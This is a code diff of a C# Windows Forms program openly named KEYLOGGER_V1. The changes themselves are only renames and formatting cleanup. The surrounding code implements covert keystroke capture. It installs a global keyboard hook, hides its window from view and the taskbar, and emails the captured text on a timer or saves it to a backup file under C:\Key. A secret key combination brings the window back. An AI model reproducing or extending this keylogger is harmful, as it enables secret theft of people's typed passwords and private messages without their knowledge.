@@ -15,11 +15,11 @@ using System.Diagnostics;
 
 namespace KEYLOGGER_V1
 {
-    public partial class FrmHome : Form
+    public partial class FormularioPrincipal : Form
     {
         int conta;
         string[] names = new string[3];
-        
+
         //istanciar Class Caputura de Teclas
         globalKeyboardHook gkh = new globalKeyboardHook();
         private void HookAll()
@@ -29,27 +29,22 @@ namespace KEYLOGGER_V1
                 gkh.HookedKeys.Add((Keys)key);
             }
         }
-
         void gkh_KeyDown(object sender, KeyEventArgs e)
         {
             txtTextoDigitado.Text += GerenciamentoDeCaracteres(Convert.ToString(e.KeyCode));
         }
-
-
-
-        public FrmHome()
+        public FormularioPrincipal()
         {
             InitializeComponent();
         }
-        public FrmHome(bool visibilidade)
+        public FormularioPrincipal(bool visibilidade)
         {
             //InitializeComponent();
-            if (visibilidade == true){
+            if (visibilidade == true)
+            {
                 visivel();
             }
-           
         }
-
         private void FrmHome_Load(object sender, EventArgs e)
         {   //deixa o formulario Invisivel
             invisivel();
@@ -70,15 +65,12 @@ namespace KEYLOGGER_V1
         {
             this.Opacity = 0;
             this.ShowInTaskbar = false;
-
         }
-
         public void visivel()
         {
             this.Opacity = 100;
             this.ShowInTaskbar = true;
         }
-
         void MetodosDeEventosHook()
         {
             gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
@@ -97,12 +89,10 @@ namespace KEYLOGGER_V1
             }
 
         }
-
         private void tmEnviarEmail_Tick(object sender, EventArgs e)
         {
             BackupOrEmail();
         }
-
 
         [DllImport("wininet.dll")]
 
@@ -122,7 +112,7 @@ namespace KEYLOGGER_V1
 
             catch
             {
-               // MessageBox.Show("Esta sem Internet!!");
+                // MessageBox.Show("Esta sem Internet!!");
                 result = false;
 
             }
@@ -151,7 +141,6 @@ namespace KEYLOGGER_V1
             txtTextoDigitado.Clear();
 
         }
-
         void EnviarEmailBackup(String DirBackup)
         {
             MailMessage Email;
@@ -179,7 +168,7 @@ namespace KEYLOGGER_V1
             SW.Write(txtTextoDigitado.Text);
             SW.Close();
             txtTextoDigitado.Clear();
-           // MessageBox.Show("Criado backup com sucesso!");
+            // MessageBox.Show("Criado backup com sucesso!");
         }
         void BackupOrEmail()
         {
@@ -200,16 +189,15 @@ namespace KEYLOGGER_V1
 
             }
         }
-
         private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)
         {
             File.Delete(@"C:\Key\Keylogger.txt");
-            if (txtTextoDigitado.Text != ""){
+            if (txtTextoDigitado.Text != "")
+            {
                 criarBackup(@"C:\Key\Keylogger.txt");
             }
-            
-        }
 
+        }
         String GerenciamentoDeCaracteres(String Key)
         {
 
@@ -459,15 +447,10 @@ namespace KEYLOGGER_V1
 
 
         }
-
-
-
-
         private void FrmHome_KeyPress(object sender, KeyPressEventArgs e)
         {
 
         }
-
         private void txtTextoDigitado_TextChanged(object sender, EventArgs e)
         {
             String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento
@@ -479,14 +462,14 @@ namespace KEYLOGGER_V1
                     visivel();
 
                 }
-                else { 
-                    
-                    invisivel(); 
-                                                  
+                else
+                {
+
+                    invisivel();
+
                 }
             }
         }
-
         String teclaDeVisibilidade(String texto, String caracter)
         {
 
@@ -503,9 +486,8 @@ namespace KEYLOGGER_V1
             {
                 return texto;
             }
-            
+
 
         }
-
     }
 }
